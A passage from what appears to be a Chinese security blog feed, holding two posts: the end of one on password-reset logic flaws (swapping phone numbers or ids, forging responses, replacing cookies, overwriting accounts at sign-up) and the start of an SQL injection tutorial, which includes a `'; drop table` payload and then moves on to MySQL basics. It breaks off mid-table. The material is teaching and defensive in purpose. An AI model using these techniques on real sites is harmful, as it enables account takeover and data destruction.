rel="noopener">天天网任意账户密码重置（二）</a></p><p>这里的加密验证字符串和之前返回数据中的那个字符串竟然是同一个。既然如此，说明天天网的这个找回密码设计本来就是有问题的，那个邮箱验证码就可以直接绕过了。</p><h2 id="验证码未绑定用户"><a href="#验证码未绑定用户" class="headerlink" title="验证码未绑定用户"></a>验证码未绑定用户</h2><p><strong>造成原因</strong>：<br>输入手机号和验证码进行重置密码的时候，仅对验证码是否正确进行了判断，未对该验证码是否与手机号匹配做验证</p><p><strong>测试方法</strong>：<br>在提交手机号和验证码的时候替换手机号为他人手机号进行测试，成功通过验证并重置他人密码</p><h2 id="修改接收的手机或邮箱"><a href="#修改接收的手机或邮箱" class="headerlink" title="修改接收的手机或邮箱"></a>修改接收的手机或邮箱</h2><p><strong>造成原因</strong>：<br>用户名、手机号、验证码三者没有<code>统一</code>进行验证，仅判断了三者中的手机号和验证是否匹配和正确，如果正确则判断成功并进入下一流程。</p><p><strong>测试方法</strong>：<br>输入用户名获取验证码，修改接收验证码的手机号为自己的号码，自己手机成功接收验证码，提交到网站进行验证，验证成功并进入下一流程。</p><p>点击找回密码，首先我们输入<code>zhangwei</code>，然后点击获取验证码，这个时候把<code>手机号</code>改为我们自己的号码，(一般情况下这里是在数据包中进行修改的)，然后输入我们<code>自己</code>的号码和验证码，成功跳到重置密码的页面，密码重置成功。</p><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-053349.html" target="_blank" rel="noopener">OPPO 手机重置任意账户密码（3）</a></p><p>在手机号验证码这里，填写自己的手机号，即可成功绕过校验，从而可以直接进入下一步重置密码的操作。</p><h2 id="本地验证绕过"><a href="#本地验证绕过" class="headerlink" title="本地验证绕过"></a>本地验证绕过</h2><p><strong>造成原因</strong>：<br>客户端在本地进行验证码是否正确的判断，而该判断结果也可以在本地修改，最终导致欺骗客户端，误以为我们已经输入正确的验证码。</p><p><strong>测试方法</strong>：<br>重置目标用户，输入错误验证码，修改返回包，把错误改为正确，即可绕过验证步骤，最终重置用户密码。</p><h2 id="跳过验证步骤"><a href="#跳过验证步骤" class="headerlink" title="跳过验证步骤"></a>跳过验证步骤</h2><p><strong>造成原因</strong>：<br>对修改密码的步骤，没有做校验，导致可以直接输入最终修改密码的网址，直接跳转到该页面，然后输入新密码达到重置密码的目的。</p><p><strong>测试方法</strong>：<br>首先使用<code>自己</code>的账号<code>走一次流程</code>，<code>获取</code>每个步骤的页面<code>链接</code>，然后记录页面<code>3</code>对应的输入新密</p><p>首先我们走一下所有的步骤，页面 1、页面 2、页面 3，然后记录下页面 3 的链接：</p><p>然后尝试重置他人的用户。(ps:页面<code>3</code>是在我们的邮箱里接收到的链接)</p><blockquote><p>图片是某集团系统，所以用户<code>wangshuai</code>，邮箱对应<a href="mailto:`wangshuai@xxx.com.cn" target="_blank" rel="noopener">`wangshuai@xxx.com.cn</a>`</p></blockquote><p>使用账户<code>wangshuai</code>，点击获取验证码，然后补齐下面的链接 <code>https://xxx/page/login/veifyAccess.html?username=wangshuai&amp;email=wangshuai@xxx.com.cn</code>，<code>访问</code>后即可<code>直接重置</code>该用户的密码。</p><p>这个漏洞不用按照正常的流程来走，这里的话直接补齐设置新密码的链接，然后利用这里链接可以直接重置任意用户的密码。</p><h2 id="未校验用户字段的值"><a href="#未校验用户字段的值" class="headerlink" title="未校验用户字段的值"></a>未校验用户字段的值</h2><p><strong>造成原因</strong>：<br>在整个重置密码的流程中，只对验证码和手机号做了校验，未对后面设置新密码的用户身份做判断，导致在最后一步通过修改用户身份来重置他人的密码</p><p><strong>测试方法</strong>：<br>使用自己的手机号走流程，在走到最后一个设置密码的流程时，修改数据包里的用户信息。</p><h2 id="修改密码处-id-可替换"><a href="#修改密码处-id-可替换" class="headerlink" title="修改密码处 id 可替换"></a>修改密码处 id 可替换</h2><p><strong>造成原因</strong>：<br>修改密码的时候，没有对原密码进行判断，且根据 id 的值来修改用户的密码，类似的 SQL 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span>  <span class="keyword">password</span>=<span class="string">"qwer1234"</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span></span><br></pre></td></tr></table></figure><p>修改数据包里的 id 值，即可修改他人密码。</p><p><strong>测试方法</strong>：<br>修改自己用户密码，抓取数据包，替换数据包中用户对应的 id 值，即可修改他人的密码。</p><h2 id="Cookie-值的替换"><a href="#Cookie-值的替换" class="headerlink" title="Cookie 值的替换"></a>Cookie 值的替换</h2><p><strong>造成原因</strong><br>：重置密码走到最后一步的时候仅判断唯一的用户标识 cookie 是否存在，并没有判断该 cookie 有没有通过之前重置密码过程的验证，导致可替换 cookie 重置他人用户密码。（cookie 可指定用户获取）</p><p><strong>测试方法</strong>：<br>重置自己用户密码到达最后阶段，抓到数据包，并在第一阶段重新获取目标用户 cookie，替换 cookie 到我们抓取的数据包中，发包测试。</p><p><strong>关键点</strong>：</p><p><code>cookie</code>可指定用户获取,尝试用他人账号来找回密码的时候，抓取数据包，可以从中提取出<code>cookie</code>值，然后就可以利用这个<code>cookie</code>值，就可以重置指定用户的密码了。</p><h2 id="修改信息时替换字段值"><a href="#修改信息时替换字段值" class="headerlink" title="修改信息时替换字段值"></a>修改信息时替换字段值</h2><p><strong>造成原因</strong>：<br>在执行修改信息的 SQL 语句的时候，用户的密码也当作字段执行，且根据隐藏参数 login id 来执行，这样就导致修改隐藏参数 login id 的值，就可以修改他人的用户密码</p><p><strong>测试方法</strong>：<br>修改个人资料的时候，抓取数据包，然后修改数据包的参数和对应的值，参数名一般可以在其他地方找到，替换隐藏参数即可修改他人的密码等信息。</p><h2 id="邮箱弱-token"><a href="#邮箱弱-token" class="headerlink" title="邮箱弱 token"></a>邮箱弱 token</h2><p>找回密码有两种常见的方式，即手机验证码和邮箱 token，手机验证码都是随机生成的明文，邮箱 token 一般是加密的字符串，开发者会觉得居然是加密字符串是不是可以不用随机的字符串了呢？但往往由于未使用随机字符串，便造成漏洞的产生。</p><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-08333.html" target="_blank" rel="noopener">奇虎 360 任意用户密码修改漏洞</a></p><p><strong>加固方法</strong></p><p>关键加密的地方尽量使用随机值或者其他更高级的加密方式，防止攻击者发现加密规律，从而进行恶意操作。</p><h2 id="注册覆盖"><a href="#注册覆盖" class="headerlink" title="注册覆盖"></a>注册覆盖</h2><p>正常来说，注册一个用户是往数据表中添加一条数据，如果数据已存在，注册就会失败。可是有时候开发者却不是这么做的，他们发现用户账号已存在时，不是提示用户注册失败，而是直接修改用户的信息。</p><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-088708.html" target="_blank" rel="noopener">中铁快运奇葩方式重置任意用户密码(admin 用户演示)</a></p><p>在注册用户时，如果先输入用户名，在鼠标离开后会进行用户名是否存在的校验。但是如果把用户名留着最后输入，比如输入一个已有的用户名 admin，在鼠标离开输入框并点击提交按钮后，虽然也会进行用户名是否存在的校验，但表单仍然提交上去了，此时就会直接修改掉 admin 用户的密码。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;逻辑漏洞概述&quot;&gt;&lt;a href=&quot;#逻辑漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;逻辑漏洞概述&quot;&gt;&lt;/a&gt;逻辑漏洞概述&lt;/h1&gt;&lt;p&gt;逻辑漏洞更多指一些&lt;strong&gt;业务类特有的&lt;/strong&gt;逻辑漏洞，这些漏洞的特点是很难判断是否为漏洞
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://winthorlimo.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web" scheme="https://winthorlimo.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>SQL 注入</title>
    <link href="https://winthorlimo.github.io/note/2020/undefined13/35cb7ca5.html"/>
    <id>https://winthorlimo.github.io/note/2020/undefined13/35cb7ca5.html</id>
    <published>2020-08-13T14:00:00.000Z</published>
    <updated>2020-08-20T09:26:28.437Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><p><strong>注入攻击是 Web 安全领域中一种最为常见的攻击方式。</strong></p><p>XSS 本质上也是一种针对 HTML 的注入攻击。</p><p>注入攻击的本质，是把用户输入的数据当做代码执行。这里有两个关键条件:</p><ul><li><strong>用户能够控制输入</strong></li><li><strong>原本程序要执行的代码，拼接了用户输入的数据。</strong></li></ul><h1 id="SQL-注入攻击简介"><a href="#SQL-注入攻击简介" class="headerlink" title="SQL 注入攻击简介"></a>SQL 注入攻击简介</h1><p>在今天，SQL 注入对于开发者来说，应该是耳熟能详了。而 SQL 注入第一次为公众所知，是在 1998 年的著名黑客杂志《Phrack》第 54 期上，一位名叫rfp的黑客发表了一篇题为 “NT Web Tech-nology Vulnerabilities” 的文章。</p><p>一个 SQL 注入的典型例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Shipcity;</span><br><span class="line">ShipCity = Request.form (<span class="string">"ShipCity"</span>);</span><br><span class="line"><span class="keyword">var</span> sql = <span class="string">"select * from OrdersTable where ShipCity = '"</span> + ShipCity + <span class="string">"'"</span>;</span><br></pre></td></tr></table></figure><p>变量 ShipCity 的值由用户提交，在正常情况下，假如用户输入<code>Beijing</code>，那么SQL语句会执行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> OrdersTable <span class="keyword">WHERE</span> ShipCity = <span class="string">'Beijing'</span></span><br></pre></td></tr></table></figure><p>但假如用户输入一段有语义的 SQL 语句，比如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Beijing'; <span class="keyword">drop</span> <span class="keyword">table</span> OrdersTable<span class="comment">--</span></span><br></pre></td></tr></table></figure><p>那么，SQL 语句在实际执行时就会如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> OrdersTable <span class="keyword">WHERE</span> ShipCity = <span class="string">'Beijing'</span>;<span class="keyword">drop</span> <span class="keyword">table</span> OrdersTable<span class="comment">--'</span></span><br></pre></td></tr></table></figure><p>原本正常执行的查询语句，现在变成了查询完后，再执行一个drop表的操作，而这个操作，是用户构造了恶意数据的结果。</p><p><strong>总的来说，防范 SQL 注入的话 可以注意以下几个点：</strong></p><ol><li>不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和 双引号进行转换等。</li><li>不要使用动态拼接 SQL，可以考虑使用存储过程进行数据查询存取，例如 Django 自带的 Model。</li><li>应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装</li><li>不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。</li><li>不要把机密信息直接存放，对密码等敏感的信息进行加密。</li></ol><h1 id="MySQL-基础"><a href="#MySQL-基础" class="headerlink" title="MySQL 基础"></a>MySQL 基础</h1><p>MySQL 是最流行的关系型数据库管理系统，市场占有率比较高，在 CTF 比赛中也经常出现。</p><h2 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h2><ul><li><strong>数据库:</strong> 数据库是一些关联表的集合。</li><li><strong>数据表:</strong> 表是数据的矩阵。在一个数据库中的表看起来像一个简单的电子表格。</li></ul><p>数据表由 行（row）和 列 (column)组成，是一个二维的网格结构，每个列都是一个字段。</p><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p><strong>创建数据库</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> 数据库名;</span><br></pre></td></tr></table></figure><p><strong>删除数据库</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> 数据库名;</span><br></pre></td></tr></table></figure><p><strong>查询所有数据库</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></table></figure><p><strong>选择数据库</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> 数据库名;</span><br></pre></td></tr></table></figure><p><strong>查询数据库下的表名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure><p><strong>创建数据表</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="string">`tbl`</span>(</span><br><span class="line">   <span class="string">`id`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> AUTO_INCREMENT,</span><br><span class="line">   <span class="string">`title`</span> <span class="built_in">VARCHAR</span>(<span class="number">500</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">   <span class="string">`author`</span> <span class="built_in">VARCHAR</span>(<span class="number">40</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">   PRIMARY <span class="keyword">KEY</span> ( <span class="string">`id`</span> )</span><br><span class="line">)<span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br></pre></td></tr></table></figure><p><strong>删除表</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> 数据表名;</span><br></pre></td></tr></table></figure><p><strong>插入数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl</span><br><span class="line">    -&gt; (title, author)</span><br><span class="line">    -&gt; <span class="keyword">VALUES</span></span><br><span class="line">    -&gt; (<span class="string">"你看得到我打在屏幕上的字，看不到我落在键盘上的泪。"</span>, <span class="string">"画船听雨"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl</span><br><span class="line">    -&gt; (title, author)</span><br><span class="line">    -&gt; <span class="keyword">VALUES</span></span><br><span class="line">    -&gt; (<span class="string">"成功的花，人们只惊羡她现时的明艳！然而当初她的芽儿，浸透了奋斗的泪泉，洒遍了牺牲的血雨。"</span>, <span class="string">"冰心"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl</span><br><span class="line">    -&gt; (title, author)</span><br><span class="line">    -&gt; <span class="keyword">VALUES</span></span><br><span class="line">    -&gt; (<span class="string">"The quieter you become, the more you are able to hear"</span>, <span class="string">"Kali Linux"</span>);</span><br></pre></td></tr></table></figure><p><strong>更新语句</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> tbl <span class="keyword">set</span> title=<span class="string">'好好学习 天天向上'</span> <span class="keyword">WHERE</span> author=<span class="string">'画船听雨'</span>;</span><br></pre></td></tr></table></figure><p><strong>删除数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> tbl <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br></pre></td></tr></table></figure><h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><p>可以直接使用 select 查询任意字符串或者函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 'Hello World';</span><br><span class="line">+<span class="comment">-------------+</span></span><br><span class="line">| Hello World |</span><br><span class="line">+<span class="comment">-------------+</span></span><br><span class="line">| Hello World |</span><br><span class="line">+<span class="comment">-------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>也可以带入相关的函数查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select user(),version(),database();</span><br><span class="line">+<span class="comment">------------------+-----------+------------+</span></span><br><span class="line">| user()           | version() | database() |</span><br><span class="line">+<span class="comment">------------------+-----------+------------+</span></span><br><span class="line">| root@10.211.55.2 | 5.5.53    | test       |</span><br><span class="line">+<span class="comment">------------------+-----------+------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>也可以查询数据表中的信息：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> tbl;              <span class="comment">-- 所有值</span></span><br><span class="line"><span class="keyword">select</span> title <span class="keyword">from</span> tbl;          <span class="comment">-- 查询title的值</span></span><br><span class="line"><span class="keyword">select</span> author <span class="keyword">from</span> tbl;         <span class="comment">-- 查询author的值</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,title,author <span class="keyword">from</span> tbl; <span class="comment">-- 等同于 * 查询</span></span><br></pre></td></tr></table></figure><p><strong>条件查询</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> author <span class="keyword">from</span> tbl <span class="keyword">where</span> anthor=<span class="string">'冰心'</span>; <span class="comment">#查询作者为冰心的内容</span></span><br></pre></td></tr></table></figure><blockquote><p>默认是无法区分大小写的，如果要区分大小的的话，只需要在 where 的后面加个 binary 就可以了</p></blockquote><p><strong>like 模糊查询</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> tbl  <span class="keyword">where</span> author <span class="keyword">like</span> <span class="string">'a%'</span>;</span><br></pre></td></tr></table></figure><blockquote><p>默认是无法区分大小写的，如果要区分大小的的话，只需要在 like 的后面加个 binary 就可以了</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> tbl  <span class="keyword">where</span> author <span class="keyword">like</span> <span class="built_in">binary</span> <span class="string">'a%'</span>;</span><br></pre></td></tr></table></figure><p><strong>union 联合查询</strong></p><p>连接两个以上的 SELECT 语句的结果组合到一个结果集合中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users union select version(),database(),user();</span><br><span class="line">+--------+----------+------------------+</span><br><span class="line">| id     | username | password         |</span><br><span class="line">+--------+----------+------------------+</span><br><span class="line">| 1      | Dumb     | Dumb             |</span><br><span class="line">| 2      | Angelina | I-kill-you       |</span><br><span class="line">| 3      | Dummy    | p@ssword         |</span><br><span class="line">| 4      | secure   | crappy           |</span><br><span class="line">| 5      | stupid   | stupidity        |</span><br><span class="line">| 6      | superman | genious          |</span><br><span class="line">| 7      | batman   | mob!le           |</span><br><span class="line">| 8      | admin    | admin            |</span><br><span class="line">| 9      | admin1   | admin1           |</span><br><span class="line">| 10     | admin2   | admin2           |</span><br><span class="line">| 11     | admin3   | admin3           |</span><br><span class="line">| 12     | dhakkan  | dumbo            |</span><br><span class="line">| 14     | admin4   | admin4           |</span><br><span class="line">| 5.5.53 | security | root@10.211.55.2 |</span><br><span class="line">+--------+----------+------------------+</span><br><span class="line">14 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><p>思考：这条语句如果这样写呢？</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">version</span>(),<span class="keyword">database</span>();</span><br></pre></td></tr></table></figure><p>结果就会报错，因为第三列空了</p><p><strong>order by 排序</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 按照id升序排序</span></span><br><span class="line">select * from users order by id asc;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按照id降序排序</span></span><br><span class="line">select * from users order by id desc;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据第1个字段排序</span></span><br><span class="line">mysql&gt; select * from users order by 1;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据第2个字段排序</span></span><br><span class="line">mysql&gt; select * from users order by 2;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">+----+----------+------------+</span><br></pre></td></tr></table></figure><p><strong>group by 分组排序</strong></p><p>假设有如下数据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----+--------+---------------------+--------+</span><br><span class="line">| id | name   | date                | singin |</span><br><span class="line">+----+--------+---------------------+--------+</span><br><span class="line">|  1 | 小明 | 2016-04-22 15:25:33 |      1 |</span><br><span class="line">|  2 | 小王 | 2016-04-20 15:25:47 |      3 |</span><br><span class="line">|  3 | 小丽 | 2016-04-19 15:26:02 |      2 |</span><br><span class="line">|  4 | 小王 | 2016-04-07 15:26:14 |      4 |</span><br><span class="line">|  5 | 小明 | 2016-04-11 15:26:40 |      4 |</span><br><span class="line">|  6 | 小明 | 2016-04-04 15:26:54 |      2 |</span><br><span class="line">+----+--------+---------------------+--------+</span><br></pre></td></tr></table></figure><p>使用分组查询语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT name, COUNT(*) FROM table GROUP BY name;</span><br><span class="line">+--------+----------+</span><br><span class="line">| name   | COUNT(*) |</span><br><span class="line">+--------+----------+</span><br><span class="line">| 小丽 |        1 |</span><br><span class="line">| 小明 |        3 |</span><br><span class="line">| 小王 |        2 |</span><br><span class="line">+--------+----------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br></pre></td></tr></table></figure><p><strong>LIMIT 限制</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users order by id;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从第1条数据查询 查询2个数据</span></span><br><span class="line">mysql&gt; select * from users order by id <span class="built_in">limit</span> 0,2;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从第2条数据查询 查询6个数据</span></span><br><span class="line">mysql&gt; select * from users order by id <span class="built_in">limit</span> 1,6;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  2 | Angelina | I-kill-you 